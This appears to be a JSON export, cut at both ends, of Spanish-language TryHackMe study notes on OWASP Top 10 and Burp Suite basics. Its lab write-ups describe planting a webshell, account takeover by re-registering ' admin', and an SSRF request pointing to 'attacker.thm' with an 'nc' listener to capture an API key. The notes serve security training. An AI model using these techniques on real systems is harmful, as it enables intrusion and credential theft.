20251011135154.png]]\n5. La contrase√±a funciona:\n   ![[Pasted image 20251011135812.png]]\n6. Buscamos m√°s vulnerabilidades, ya que necesitamos acceder a `/opt/flag.txt`.\n   ![[Pasted image 20251011140737.png]]\n7. El ejecutable nos lanza un error:\n   ![[Pasted image 20251011143426.png]]\n8. Como el c√≥digo no funciona a pesar de modificarlo lo leemos y vemos que est√° insertando una webshell en la imagen, por lo que vamos a hacerlo manualmente desde la p√°gina vulnerada de admin:\n   ![[Pasted image 20251011142510.png]]\n9. Activamos Burp Suite:\n   ![[Pasted image 20251011143810.png]]\n10. Cambiamos el valor de la imagen:\n    ![[Pasted image 20251011144637.png]]\n11. Vemos desde donde se est√°n cargando las fotos:\n   ![[Pasted image 20251011143332.png]]\n12. Intentamos cargar la consola php:\n    ![[Pasted image 20251011144924.png]]\n13. Obtenemos la flag\n    ![[Pasted image 20251011145025.png]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "12. V. Security Misconfiguration",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/8-web-hacking/5-owasp-top-10-2021/12-v-security-misconfiguration/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/8. Web Hacking/5. OWASP Top 10 - 2021/12. V. Security Misconfiguration.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 8. Web Hacking > 5. OWASP Top 10 - 2021",
    "content": "La configuraci√≥n err√≥nea es distinta de las Top 10 porque ocurre cuando la seguridad pod√≠a haber sido implementada correctamente pero no lo fue. Incluso si tienes las versiones lo m√°s actualizadas posibles, la mala configuraci√≥n puede vulnerar todo tu sistema.\n\nEstas incluyen:\n\n- Permisos de servicios en la nube pobremente configurados.\n- Tener habilitadas funcionalidades innecesarias como servicios, p√°ginas o privilegios.\n- Cuentas por defecto sin cambio de credenciales.\n- Mensajes de error con demasiada informaci√≥n.\n- No usar HTTPS.\n\nEsta vulnerabilidad puede conducir, usualmente, a otras.\n\n-------------------------\n<h2>Debuggear Interfaces</h2>\nUna mala configuraci√≥n com√∫n tiene que ver con el debugging y c√≥mo se maneja. Si como desarrollador te olvidas de eliminar estos debugs, un atacante podr√≠a usarlos como fuente de informaci√≥n para romper el sistema.\n\nUn ejemplo de este tipo de vulnerabilidad es cuando Patreon fue hackeado en 2015. Cinco d√≠as antes, un investigador de seguridad le comunic√≥ a Patreon que hab√≠a encontrado una interfaz de debugging abierta para la consola Werkzeug. Esta pod√≠a ser accedida mediante URL con `/console`.\n\n-----------------\n<h2>Challenge</h2>\n1. Navegamos hasta la p√°gina proporcionada:\n   ![[Pasted image 20251010192138.png]]\n2. All√≠ ejecutamos el c√≥digo que nos dan:\n   ![[Pasted image 20251010192245.png]]\n3. Vemos el c√≥digo fuente de la app, por lo que podemos intentar leerlo:\n   ![[Pasted image 20251010192428.png]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "17. Identification and Authetification Failures Practical",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/8-web-hacking/5-owasp-top-10-2021/17-identification-and-authetification-failures-practical/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/8. Web Hacking/5. OWASP Top 10 - 2021/17. Identification and Authetification Failures Practical.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 8. Web Hacking > 5. OWASP Top 10 - 2021",
    "content": "Para este ejemplo, miraremos un fallo l√≥gico en el mecanismo de autentificaci√≥n.\n\nMuchas veces, lo que ocurre es que los desarrolladores olvidan sanitizar el input dado por el usuario (username y password), lo que los hace vulnerables a ataques de tipo SQLI. De todas formas no centraremos en una vulnerabilidad que ocurre por un eror del programador: re-registro de un usuario existente.\n\nVeamos un ejemplo. Queremmos acceder a la cuenta `admin`, por lo que registramos un usuario \" admin\", ahora, al entrar, podremos ver el contenido de su cuenta.\n\n------------------\n<h2>Challenge</h2>\n1. Entramos a la p√°gina dada.\n   ![[140.png]]\n2. Intentamos registrar el usuario dado\n   ![[141.png]]\n3. Nos da error as√≠ que vamos a intentar otro nombre de usuario.\n   ![[142.png]]\n4. Probamos con  \" darren\" en vez de \"darren\".\n   ![[143.png]]\n5. Ahora si que ha funcionado.\n   ![[144.png]]\n6. Iniciamos sesi√≥n:\n   ![[145.png]]\n7. Obtenemos una flag:\n   ![[146.png]]\n8. Ahora pobamos a hacerlo con **arthur**:\n   ![[147.png]]\n9. Iniciamos sesion con arthur:\n   ![[148.png]]\n10. Obtenemos la segunda flag:\n    ![[149.png]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "3. I. Broken Access Control",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/8-web-hacking/5-owasp-top-10-2021/3-i-broken-access-control/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/8. Web Hacking/5. OWASP Top 10 - 2021/3. I. Broken Access Control.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 8. Web Hacking > 5. OWASP Top 10 - 2021",
    "content": "Los sitios web tienen p√°ginas protegidas de los visitantes normales, por ejemplo, s√≥lo el administrador de un sitio web deber√≠a poder acceder a la p√°gina para controlar a otros usuarios. Si un visitante puede acceder a estas, entonces los controles de acceso est√°n rotos.\n\nEste hecho puede llevar a lo siguiente:\n\n- Ser capaz de ver informaci√≥n sensible de otros usuarios.\n- Acceder a funcionalidades no autorizadas.\n\nPor decirlo de manera simple, esta vulnerabilidad permite a los usuarios bypassear la **autorizaci√≥n**.\n\nPor ejemplo, una [vulnerabilidad](https://bugs.xdavidhu.me/google/2021/01/11/stealing-your-private-videos-one-frame-at-a-time/) encontrada en 2019, permit√≠a a un atacante obtener cada frame de un v√≠deo marcado como privado.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "19. Software Integrity Failure",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/8-web-hacking/5-owasp-top-10-2021/19-software-integrity-failure/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/8. Web Hacking/5. OWASP Top 10 - 2021/19. Software Integrity Failure.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 8. Web Hacking > 5. OWASP Top 10 - 2021",
    "content": "Sup√≥n que tienes una p√°gina web que usa librer√≠as de terceros guardadas en servidores externos fuera de tu control. Mientras que esto puede sonar un poco extra√±o, es una pr√°ctica bastante com√∫n. Toma, por ejemplo jQuery, una librer√≠a muy usada de javascript. Si quieres incluirla en tu p√°gina desde sus servidores sin descargarla:\n\n```html\n<script src=\"https://code.jquery.com/jquery-3.6.1.min.js\"></script>\n```\n\nCuando un usuario navegue hasta tu p√°gina el navegador descargar√° jQuery de la fuente externa especificada.\n\n![[Pasted image 20251013143945.png]]\n\nEl problema es que si un atacante consigue hackear el repositorio oficial de jQuery, podr√≠an cambiar los contenidos de `https://code.jquery.com/jquery-3.6.1.min.js` para inyectar c√≥digo malicioso. Como resultado, cualquiera visitando tu p√°gina web ejecutar√≠a dicho c√≥digo en su navegador sin saberlo.\n\nLos navegadores modernos incluyen una funcionalidad que te permite proporcionar un hash de tal manera que los recursos externos s√≥lo se descargan si coinciden los hashes. La manera correcta de integrar librer√≠as de terceros de forma segura ser√≠a:\n\n```html\n<script src=\"https://code.jquery.com/jquery-3.6.1.min.js\" integrity=\"sha256-o88AwQnZB+VDvE9tvIXrMQaPlFFSUTR+nldQm1LuPXQ=\" crossorigin=\"anonymous\"></script>\n```\n\nPuedes usar [SRI Hash](https://www.srihash.org/) para no tener que descargar y hashear t√∫ mismo los archivos que te interesen.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "22. X. Server-Side Request Forgery (SSRF)",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/8-web-hacking/5-owasp-top-10-2021/22-x-server-side-request-forgery-ssrf/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/8. Web Hacking/5. OWASP Top 10 - 2021/22. X. Server-Side Request Forgery (SSRF).md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 8. Web Hacking > 5. OWASP Top 10 - 2021",
    "content": "Este tipo de vulnerabilidad ocurre cuando un atacante convence a la aplicaci√≥n web de mandar las peticiones en su representaci√≥n a destinaciones arbitrarias mientras tiene el control sobre los contenidos de la petici√≥n en s√≠ misma. Las vulnerabilidades SSRF com√∫nmente se ocasionan donde nuestra aplicaci√≥n web utiliza servicios de terceros.\n\nPiensa, por ejemplo, en una aplicaci√≥n web que usa una API externa para mandar notificaciones SMS a sus clientes. Por cada email, la app tiene que realizar una petici√≥n web al servidor proveedor de SMS para mandar el mensaje.Ya que los proveedores de mensajer√≠a cobran por el uso de mensajes, nos piden a√±adir una clave secreta, que te preasignan. Los servidores API de claves como tokens de autentificaci√≥n te permiten que el proveedor sepa qui√©n eres.\n\n![[Pasted image 20251013232653.png]]\n\nMirando el diagrama arriba mostrado es f√°cil ver d√≥nde est√° la vulnerabilidad. La aplicaci√≥n expone el par√°metro `server` a los usuarios, que define el nombre del servidor proveedor de SMS. Si un atacante quisiese, simplemente cambiar√≠a el valor del par√°metro `server` para apuntar a una m√°quina que ellos controlen. Como parte del mensaje, recibir√≠an la clave API, permiti√©ndoles usar los servicios SMS a tu costa. Para hacerlo, s√≥lo tendr√≠a que hace la siguiente petici√≥n a tu sitio web:\n\n`https://www.mysite.com/sms?server=attacker.thm&msg=ABC`\n\nEntonces simplemente capturar√≠as el tr√°fico:\n\n```http\nuser@attackbox$ nc -lvp 80\nListening on 0.0.0.0 80\nConnection received on 10.10.1.236 43830\nGET /:8087/public-docs/123.pdf HTTP/1.1\nHost: 10.10.10.11\nUser-Agent: PycURL/7.45.1 libcurl/7.83.1 OpenSSL/1.1.1q zlib/1.2.12 brotli/1.0.9 nghttp2/1.47.0\nAccept: */*\n```\n\nAunque esto no parezca amenazante, SSRF se puede usar para:\n\n- Enumerar redes internas, incluyendo direcciones IPs y puertos.\n- Abusar relaciones de confianza entre servidores y ganar acceso a servicios de otra manera restringidos.\n- Interactuar con algunos servicios no-HTTP para conseguir ejecuci√≥n remota de comandos (RCE).\n\n-----------------------\n<h2>Challenge</h2>\n1. Accedemos a la p√°gina web:\n   ![[Pasted image 20251013233709.png]]\n2. Despu√©s de investigar un poco encontramos \"admin area\":\n   ![[Pasted image 20251013233831.png]]\n3. Si nos fijamos, el servidor apunta a una direcci√≥n curiosa al descargar el CV:\n   ![[Pasted image 20251013234005.png]]\n4. Haciendo uso de lo que hemos aprendido, vamos a intentar SSRF:\n   ![[Pasted image 20251013234205.png]]\n5. Y voil√†:\n   ![[Pasted image 20251013234231.png]]\n6. Para acceder a admin podemos modificar url de la descarga del CV y meter localhost con el endpoint `admin`:\n   ![[Pasted image 20251014000016.png]]\n7. La flag extra es:\n   ![[Pasted image 20251014000039.png]]\n\n>[!NOTE] The `#` symbol indicates a fragment identifier in a URL, which is often used by browsers to navigate to a specific part of a webpage. When you add `%23` (the URL-encoded version of `#`), it may be tricking the server into treating it as part of the URL, allowing the request to reach the `/admin` endpoint. Without it, the server might not recognize the path correctly or could return a different response.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "0. Burp Suite - The Basics",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/8-web-hacking/4-burp-suite-the-basics/0-burp-suite-the-basics/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/8. Web Hacking/4. Burp Suite - The Basics/0. Burp Suite - The Basics.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 8. Web Hacking > 4. Burp Suite - The Basics",
    "content": "[[Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/8. Web Hacking/4. Burp Suite - The Basics/1. Introduction]]\n[[2. What is Burp Suite]]\n[[3. Features of Burp Community]]\n[[4. Installation]]\n[[5. The Dashboard]]\n[[6. Navigation]]\n[[7. Options]]\n[[8. Introduction to the Burp Proxy]]\n[[9. Connecting through the Proxy (FoxyProxy)]]\n[[10. Site Map and Issue Definitions]]\n[[11. The Burp Suite Browser]]\n[[12. Scoping and Targeting]]\n[[13. Proxying HTTPS]]\n[[14. Example Attack]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "10. Site Map and Issue Definitions",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/8-web-hacking/4-burp-suite-the-basics/10-site-map-and-issue-definitions/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/8. Web Hacking/4. Burp Suite - The Basics/10. Site Map and Issue Definitions.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 8. Web Hacking > 4. Burp Suite - The Basics",
    "content": "La pesta√±a **Target**  en Burp Suite ofrece m√°s que simple control sobre el scope de nuestro testeo. Consiste en tres subpesta√±as:\n\n1. **Site map:** Esta nos permite mapear la web que estamos enfocando en estructura de √°rbol. En Burp Suite Professional esto se conjunta con el escaneo/fuzzeo autom√°tico de web para dar una visi√≥n m√°s amplia. Aun as√≠, con Burp Suite Community, se puede usar durante la fase de escaneo, lo que es tremendamente √∫til para mapear webs y APIs ya que las APIs ser√°n accedidas por la web.\n2. **Issue Definitions:** Aunque la versi√≥n de comunidad no incluye la funcionalidad de escaneo de vulnerabilidades completa, todav√≠a podemos usarla con una cantidad razonable de vulnerabilidades a escanear. Esta secci√≥n ofrece una lista extensiva de vulnerabilidades web.\n3. **Scope settings:** Este ajuste nos permite controlar el scope del objetivo en Burp Suite. Nos permite excluir/incluir dominios en el scope de nuestro testeo. Haciendo esto podemos centrarnos en el tr√°fico que queremos capturar.\n\n-------------------------\n<h2>Reto</h2>",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "1. Introduction",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/8-web-hacking/4-burp-suite-the-basics/1-introduction/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/8. Web Hacking/4. Burp Suite - The Basics/1. Introduction.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 8. Web Hacking > 4. Burp Suite - The Basics",
    "content": "En esta unidad vamos a comprender las funciones b√°sicas de Burp Suite. Nuestro foco se centrar√° en:\n\n- Una introducci√≥n completa a Burp Suite.\n- Una vista por encima pero razonada de las m√∫ltiples herramientas disponibles en el marco de trabajo.\n- Una gu√≠a detallada del proceso de instalar Burp Suite en nuestro sistema.\n- Navegar y configurar Burp Suite.\n\nTambi√©n introduciremos el n√∫cleo de Burp Suite que es Burp Proxy. Las pr√≥ximas unidades en referencia a Burp Suite ser√°n m√°s pr√°cticas, mientras que esta que es la primera ser√° m√°s te√≥rica.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "12. Scoping and Targeting",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/8-web-hacking/4-burp-suite-the-basics/12-scoping-and-targeting/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/8. Web Hacking/4. Burp Suite - The Basics/12. Scoping and Targeting.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 8. Web Hacking > 4. Burp Suite - The Basics",
    "content": "Al fin llegamos a uno de los aspectos m√°s importantes del uso del proxy de Burp: el **Scoping**.\n\nCapturar y registrar el tr√°fico puede resultar abrumador e inconveniente, especialmente cuando s√≥lo queremos concentrarnos en ciertas aplicaciones web. Aqu√≠ es donde entra el scoping.\n\nAl configurar un scope a nuestro proyecto, podemos definir qu√© pasa por el proxy y queda registrado y qu√© no. La manera m√°s f√°cil de hacerlo es cambiando a la pesta√±a `Target`, hacer click derecho en nuestro objetivo de la lista, a la izquierda, y seleccionar `Add to Scope`. Entonces Burp nos preguntar√° si queremos parar de registrar cualquier cosa que no est√© en el scope, a lo que diremos `yes`.\n\n![[Pasted image 20251005194715.png]]\n\nPara comprobar nuestro scope, podemos ir a la subpesta√±a **Scope settings** en la pesta√±a **Target**.\n\nEsto nos permite controlar incluyendo o excluyendo dominios o IPs. De todas formas, si desactivamos el registro para el tr√°fico fuera del scope, el proxy seguir√° interceptando todo. Para evitar esto, debemos ir a **Proxy settings** y seleccionar `And URL Is in target scope` desde la secci√≥n \"Intercept Client Requests\".\n\n![[Pasted image 20251005195115.png]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "4. Installation",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/8-web-hacking/4-burp-suite-the-basics/4-installation/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/8. Web Hacking/4. Burp Suite - The Basics/4. Installation.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 8. Web Hacking > 4. Burp Suite - The Basics",
    "content": "Burp Suite es una de esas herramientas que viene muy bien tener a mano. Ya sea para temas de aplicaciones web o m√≥vil, pentesting, bug bounty, etc.\n\n---------------------\n<h2>Descargas</h2>\nPara descargar la √∫ltima versi√≥n para otros sistemas puedes ir a esta p√°gina [web](https://portswigger.net/burp/releases/).\n\n- **Kali Linux:** Burp Suite viene pre instalado con kali. En caso de que falte puedes instalarla desde los repositorios `apt` de tu sistema.\n- **Linux, macOS y Windows:** Para otros sistemas operativos, PortSwigger ofrece instaladores dedicados para Burp Suite.\n\n--------------------\n<h2>Instalaci√≥n</h2>\nUsa el sistema apropiado para tu sistema operativo. Si no usas `sudo` durante la instalaci√≥n, se instalar√° en tu directorio `/home` y no ser√° a√±adido a tu PATH.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "3. Features of Burp Community",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/8-web-hacking/4-burp-suite-the-basics/3-features-of-burp-community/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/8. Web Hacking/4. Burp Suite - The Basics/3. Features of Burp Community.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 8. Web Hacking > 4. Burp Suite - The Basics",
    "content": "Aunque Burp Suite Community ofrece un conjunto m√°s limitado de funcionalidades, sigue siendo impresionante. Sus herramientas son altamente valiosas para testear aplicaciones web. Exploremos algunas de sus caracter√≠sticas principales:\n\n- **Proxy:** El Proxy de Burp es el aspecto con m√°s renombre. Permite interceptar y modificar peticiones y respuestas mientras interactuamos con aplicaciones web.\n- **Repeater:** Permite capturar, modificar y remandar la misma petici√≥n m√∫ltiples veces. Especialmente √∫til al crear payloads mediante prueba y error.\n- **Intruder:** A√∫n con la limitaci√≥n de frecuencia, permite mandar peticiones a endpoints. Com√∫nmente utilizado para ataques de fuerza bruta o de fuzzeo.\n- **Decoder:** Ofrece un valioso servicio para transformaci√≥n de informaci√≥n.\n- **Comparer:** Como el nombre sugiere, habilita la comparaci√≥n entre elementos de informaci√≥n ya sea a nivel de palabra o de byte.\n- **Sequencer:** T√≠picamente utilizado cuando se intenta descifrar un token, si le faltaba randomizado al generarse se puede exponer a ataques.\n\nAdem√°s de las funcionalidades pre-implementadas, la base de c√≥digo de Java facilita el desarrollo de extensiones para aumentar su funcionalidad. Estas pueden ser escritas en Java, Python (usando el int√©rprete Java-Python), o Ruby (usando el int√©rprete Java-JRuby). El m√≥dulo **Burp Suite Extender** permite la r√°pida y f√°cil carga de extensiones en el marco de trabajo mientras que el marketplace, **BApp Store**, permite descargar m√≥dulos de terceros. Aunque algunas extensiones requieren tener una licencia, sigue habiendo muchas que no lo necesitan, como por ejemplo **Logger++**.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "9. Connecting through the Proxy (FoxyProxy)",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/8-web-hacking/4-burp-suite-the-basics/9-connecting-through-the-proxy-foxyproxy/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/8. Web Hacking/4. Burp Suite - The Basics/9. Connecting through the Proxy (FoxyProxy).md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 8. Web Hacking > 4. Burp Suite - The Basics",
    "content": "Para usar el proxy de Burp Suite, necesitamos configurar nuestro navegador local para redirigir el tr√°fico a trav√©s de Burp Suite. En esta tarea, nos enfocaremos en configurarlo usando la extensi√≥n **FoxyProxy**.\n\n1. **Instalaci√≥n:** Descarga la extensi√≥n de FoxyProxy.\n2. **Acceso:** Una vez instalada, un bot√≥n con el icono de un zorro aparecer√°. Haz click en √©l.\n3. **Crear configuraci√≥n:** Dale a las opciones y despu√©s a `Add`.\n4. **A√±ade detalles:** En la p√°gina que aparece, rellena los valores:\n   - T√≠tulo: `Burp`\n   - Proxy IP: `127.0.0.1`\n   - Puerto: `8080`\n5. **Guarda:** Haz click en `Save` para guardar la configuraci√≥n.\n6. **Act√≠vala:** Haz click en el icono de FoxyProxy y selecciona la configuraci√≥n de Burp.\n   \n   >[!IMPORTANT] Si no enciendes Burp Suite y activas FoxyProxy no podr√°s mandar peticiones web.\n\n7. **Habilita:** Activa el `Intercept is on` en Burp Suite.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "6. Navigation",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/8-web-hacking/4-burp-suite-the-basics/6-navigation/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/8. Web Hacking/4. Burp Suite - The Basics/6. Navigation.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 8. Web Hacking > 4. Burp Suite - The Basics",
    "content": "En Burp Suite, la navegaci√≥n por defecto es mayormente hecha mediante las barras del men√∫ superior, que permiten cambiar entre m√≥dulos y acceder a varias subpesta√±as dentro de cada uno.\n\nAs√≠ funciona:\n\n1. **Selecci√≥n de M√≥dulo:** La fila superior muestra un men√∫ de barra con los m√≥dulos disponibles en Burp Suite.\n2. **Subpesta√±as:** Si un m√≥dulo seleccionado tiene m√∫ltiples pesta√±as, puede accederse a ellas a trav√©s de un segundo men√∫ de barra que aparece por debajo del primero.\n3. **Desfijando Pesta√±as:** SI prefieres ver m√∫ltiples pesta√±as separadas, puedes desfijarlas en una ventana diferente. Para hacer esto, ve a la opci√≥n `Window` y selecciona \"Detatch\" junto a la/s pesta√±a/s que quieras desfijar.\n\nBurp Suite tambi√©n ofrece atajos de teclado para navegaci√≥n r√°pida. Por defecto, los siguientes est√°n disponibles:\n\n| Atajo              | Pesta√±a   |\n| ------------------ | --------- |\n| `Ctrl + Shift + D` | Dashboard |\n| `Ctrl + Shift + T` | Target    |\n| `Ctrl + Shift + P` | Proxy     |\n| `Ctrl + Shift + I` | Intruder  |\n| `Ctrl + Shift + R` | Repeater  |",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "11. The Burp Suite Browser",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/8-web-hacking/4-burp-suite-the-basics/11-the-burp-suite-browser/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/8. Web Hacking/4. Burp Suite - The Basics/11. The Burp Suite Browser.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 8. Web Hacking > 4. Burp Suite - The Basics",
    "content": "Si la tarea anterior te pareci√≥ muy complicada, descansa. Esta ser√° mucho m√°s simple.\n\nAdem√°s de poder modificar nuestro navegador para trabajar con el proxy, Burp Suite incluye su propio navegador, el cual ya est√° conectado con este por defecto. Simplemente haz click en `Open Browser`.\n\nSi ejecutas Burp Suite como el usuario root, puede ser que no se te abra el navegador de Burp. Puedes solucionarlo de dos maneras:\n\n1. Crea un nuevo usuario y ejecuta Burp Suite en una cuenta sin privilegios.\n2. Ve a `Settings -> Tools -> Burp's Browser` y marca la opci√≥n `Allow Burp's browser to run without a sandbox`.\n   \n>[!CAUTION] Aunque esta segunda manera funciona, puede significar un riesgo de seguridad para ti, cuidado.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "13. Proxying HTTPS",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/8-web-hacking/4-burp-suite-the-basics/13-proxying-https/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/8. Web Hacking/4. Burp Suite - The Basics/13. Proxying HTTPS.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 8. Web Hacking > 4. Burp Suite - The Basics",
    "content": "Al interpretar tr√°fico HTTP, podemos encontrarnos un inconveniente al navegar a sitios con TLS activado. Por ejemplo, al acceder a `https://google.com/`, podemos recibir un error indicando que el Certificado de Autoridad (CA) de PortSwigger no est√° autorizado para una conexi√≥n segura.\n\n![[Pasted image 20251006222056.png]]\n\nPara solucionar este problema, podemos a√±adir manualmente el CA de PortSwigger a nuestro navegador.\n\n1. **Descargar el certificado CA:** Con el proxy activado ve a `http://burp/cert`. Esto descarga el `cacert.der`.\n2. **Accede a Firefox:** Escribe `about:preferences` en el campo URL y dale a **Enter**. Esto te llevar√° a la p√°gina de ajustes de certificado de Firefox.\n   ![[Pasted image 20251006222519.png]]\n3. **Importa el CA:** En la ventana de manejo de certificados, haz click en **Import**. Selecciona el archivo.\n4. **Configura confianza:** En la siguiente pesta√±a que aparezca, marca la opci√≥n que dice \"Trust this CA to identify websites\" y **OK**.\n   ![[Pasted image 20251006223021.png]]\n\nAhora ya podemos visitar sitios con TLS activado sin tener errores.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "2. What is Burp Suite",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/8-web-hacking/4-burp-suite-the-basics/2-what-is-burp-suite/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/8. Web Hacking/4. Burp Suite - The Basics/2. What is Burp Suite.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 8. Web Hacking > 4. Burp Suite - The Basics",
    "content": "En esencia, Burp Suite es un framework basado en Java dise√±ado para funcionar como una soluci√≥n comprensiva para realizar pentesting de aplicaciones web y m√≥viles. Se ha convertido en un est√°ndar en la industria.\n\nBurp Suite captura y habilita la manipulaci√≥n de todo el tr√°fico HTTP/HTTPS entre el navegador y el servidor. Interceptando peticiones, el usuario tiene flexibilidad para enrutarlas a varios componentes. La capacidad de interceptar, ver, manipular y redirigir las peticiones web hace de Burp Suite una herramienta de valor incalculable.\n\nBurp Suite est√° disponible en varias versiones pero nos centraremos en el uso de Burp Suite Community Edition. Aunque tambi√©n ofrece Burpsuite Professional y Enterprise que requieren licencia pero vienen con herramientas m√°s avanzadas.\n\n1. **Burp Suite Professional** es una versi√≥n de Burp Suite sin restricciones. Trae funcionalidades como:\n   \n   - Un esc√°ner de vulnerabilidades autom√°tico.\n   - Un fuzzer/brute-forcer que no est√° limitado por la frecuencia.\n   - Guardar proyectos para futuro uso y generaci√≥n de reportes.\n   - Una API que permite la integraci√≥n con otras herramientas.\n   - Acceso no restringido a a√±adir nuevas extensiones para mejores funcionalidades.\n   - Acceso a Burp Suite Collaborator.\n   \n   Es una herramienta altamente potente, haci√©ndola la elecci√≥n favorita de los profesionales.\n\n2. **Burp Suite Enterprise**, en contraste, es primordialmente usada para escaneo continuo. Dispone de un esc√°ner automatizado que peri√≥dicamente escanea aplicaciones web en busca de vulnerabilidades. Al contrario que las otras dos versiones, esta corre en un servidor y constantemente escanea las aplicaciones.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "5. The Dashboard",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/8-web-hacking/4-burp-suite-the-basics/5-the-dashboard/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/8. Web Hacking/4. Burp Suite - The Basics/5. The Dashboard.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 8. Web Hacking > 4. Burp Suite - The Basics",
    "content": "Para lanzar el programa escribe `burpsuite` en tu terminal. Una vez abierto y aceptados los t√©rminos y condiciones, podremos seleccionar un tipo de proyecto. En la versi√≥n Community las opciones son limitadas y puedes pulsar `Next` directamente.\n\nLa siguiente ventana nos permite elegir la configuraci√≥n para Burp Suite. Generalmente conviene dejar los ajustes predeterminados. Haz click en `Start Burp`.\n\nEl dashboard de Burp est√° dividido en 4 partes:\n\n![[Pasted image 20251004021343.png]]\n\n1. **Tasks:** Permite definir tareas en segundo plano que Burp Suite realizar√° mientras usas la aplicaci√≥n. En la versi√≥n Community, la tarea por defecto \"Live Passive Crawl\", que autom√°ticamente registra las p√°ginas visitadas es suficiente.\n2. **Event Log:** Ofrece informaci√≥n acerca de las acciones realizadas por Burp Suite, como ejecutar el proxy, o detalles sobre las conexiones de Burp.\n3. **Issue Activity:** Esta secci√≥n es s√≥lo de Burp Suite Professional. Muestra las vulnerabilidades identificadas por el esc√°ner autom√°tico, posicionado por severidad y filtrable basado en la certeza de la vulnerabilidad.\n4. **Advisory:** Ofrece informaci√≥n detallada sobre las vulnerabilidades identificadas, incluyendo referencias y remedios sugeridos. Esta informaci√≥n puede ser exportada a un reporte.\n\nA lo largo de las pesta√±as y ventanas de Burp Suite veras unos signos de interrogaci√≥n. Hacer click en ellos abre una nueva ventana con informaci√≥n de ayuda espec√≠fica para esa secci√≥n.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "7. Options",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/8-web-hacking/4-burp-suite-the-basics/7-options/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/8. Web Hacking/4. Burp Suite - The Basics/7. Options.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 8. Web Hacking > 4. Burp Suite - The Basics",
